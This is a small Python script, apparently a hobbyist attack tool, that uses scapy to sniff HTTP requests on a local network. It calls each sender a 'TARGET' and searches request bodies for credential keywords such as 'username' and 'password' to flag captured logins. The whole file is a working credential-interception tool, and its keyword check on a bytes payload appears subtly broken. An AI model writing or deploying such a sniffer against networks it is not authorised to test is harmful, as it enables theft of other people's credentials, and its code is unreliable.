from scapy.all import *
from scapy.layers import http 
from colorama import Fore, init

init()

keyWords = ["email", "username" , "user", "usuario", "passwd", "password"] #for sniff packages with this keywords

def captureHttp(packet): #capture all of packets in the net
    if packet.haslayer(http.HTTPRequest):
        print("[{0}+{1}] TARGET: {2} DESTINATION IP: {3} DOMINIO: {4}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, packet[IP].src, packet[IP].dst, packet[http.HTTPRequest].Host))
        if packet.haslayer(Raw): #has info
            load = packet[Raw].load
            load =load.lower()#get info from the package
            for e in keyWords:
                if e in load:
                    print(Fore.LIGHTRED_EX + "DATA FOUND")

def main():
    print("[{}+{}] Capturing packages...".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
    sniff(iface="eth0", store=False, prn=captureHttp)

if __name__ == "__main__":
    main()